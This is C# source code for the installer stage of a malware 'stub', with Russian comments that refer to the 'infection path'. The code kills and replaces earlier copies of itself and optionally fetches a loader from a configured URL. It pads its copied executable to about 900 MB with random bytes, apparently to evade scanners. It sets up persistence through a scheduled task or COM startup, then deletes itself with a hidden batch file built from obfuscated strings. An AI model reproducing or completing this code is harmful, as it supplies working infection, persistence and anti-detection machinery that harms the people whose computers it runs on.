using System;
using System.Diagnostics;
using System.IO;
using Stub.Startup;
using Stub.Help;
using System.Windows.Forms;
using Stub.Help.Modules;
using Stub.Help.Native;

namespace Stub
{
    class Install
    {
        public static async void Run()
        {
            if (!MyPath())
            {
                // Мы не в рабочей директории
                if (File.Exists(StringHelper.WorkFile.FullName))
                {
                    // Но файл по пути заражения уже есть
                    try
                    {
                        string processPath = StringHelper.WorkFile.FullName;
                        string processName = Path.GetFileNameWithoutExtension(processPath);

                        // Убиваем его процц если запущен
                        Process[] processes = Process.GetProcesses();
                        foreach (Process process in processes)
                        {
                            if (!string.IsNullOrEmpty(process.MainModule.FileName) && process.MainModule.FileName.Equals(processPath, StringComparison.OrdinalIgnoreCase))
                            {
                                process.Kill();
                            }
                        }
                        // Удаляем
                        File.Delete(processPath);
                    }
                    catch
                    {
                        // Если возникла ошибка ждем 10 сек и пробуем удалить снова
                        NativeMethods.Sleep(10000); File.Delete(StringHelper.WorkFile.FullName);
                    }
                }
                if (Config.loader)
                    await Loader.Run(Config.loaderFileUrl);

                if (Config.api_get)
                    await GetStringDownload.Run(Config.apiUrl);

                CopyFiles();
                if (File.Exists(StringHelper.WorkFile.FullName))
                {
                    Process.Start(StringHelper.WorkFile.FullName);

                    if (Config.sourcefileDelete)
                        DeleteSourceAndBuild();
                    else
                        Environment.Exit(0);
                }
                else
                {
                    StartUP();
                }
            }
            else { StartUP(); }
        }

        public static void CopyFiles()
        {
            Directory.CreateDirectory(StringHelper.WorkPatch.FullName);
            StringHelper.WorkPatch.Refresh();

            try
            {
                string tmpFile = Path.Combine(StringHelper.WorkPatch.FullName, StringHelper.Random(8) + "-" + StringHelper.Random(8) + ".log");
                File.WriteAllText(tmpFile, StringHelper.Random(256));
                if (File.Exists(tmpFile))
                    File.Delete(tmpFile);

                if (Config.AddBytes)
                {
                    using (FileStream fs = new FileStream(StringHelper.WorkFile.FullName, FileMode.OpenOrCreate))
                    {
                        byte[] byte_exe = File.ReadAllBytes(StringHelper.CurrentProcess);
                        long remainingSpace = 900 * 1024 * 1024 - fs.Length; // Вычисляем оставшееся место в байтах
                        int bytesToWrite = (int)Math.Min(remainingSpace, byte_exe.Length); // Выбираем минимум между оставшимся местом и размером byte_exe

                        fs.Write(byte_exe, 0, bytesToWrite); // Записываем только часть byte_exe, чтобы уложиться в 900 МБ

                        if (fs.Length < 900 * 1024 * 1024) // Если еще есть место, то добавляем случайные байты
                        {
                            byte[] addB = new byte[(int)Math.Min(900 * 1024 * 1024 - fs.Length, new Random().Next(Config.Addbkb * 1024, Config.Addbkb * 1024))];
                            new Random().NextBytes(addB);
                            fs.Write(addB, 0, addB.Length);
                        }
                    }
                }
                else
                {
                    File.Copy(StringHelper.CurrentProcess, StringHelper.WorkFile.FullName);
                }
            }
            catch
            {
                StartUP();
            }
        }


        public static void StartUP()
        {
            if (AdminCheck.IsUserAdministrator())
                TaskCreat.Set();
            else
                COMStartup.AddToStartup(StringHelper.WorkFile.FullName, Config.taskName);
        }

        public static bool MyPath()
        {
            return StringHelper.CurrentProcess == StringHelper.WorkFile.FullName;
        }

        public static void DeleteSourceAndBuild()
        {
            try
            {
                string batchFilePath = Path.GetTempFileName() + ".cmd";

                using (StreamWriter sw = new StreamWriter(batchFilePath))
                {
                    sw.WriteLine("%@%e%c%h%o% %o%f%f%".Replace("%", ""));
                    sw.WriteLine("%t%i%m%e%o%u%t% %6% %>% %N%U%L%".Replace("%", ""));
                    sw.WriteLine("CD " + Application.StartupPath);
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                    sw.WriteLine("CD " + Path.GetTempPath());
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(batchFilePath) + "\"" + " /f /q");
                }

                Process.Start(new ProcessStartInfo()
                {
                    FileName = batchFilePath,
                    CreateNoWindow = true,
                    ErrorDialog = false,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                Environment.Exit(0);
            }
            catch { Environment.Exit(0); }
        }
    }
}
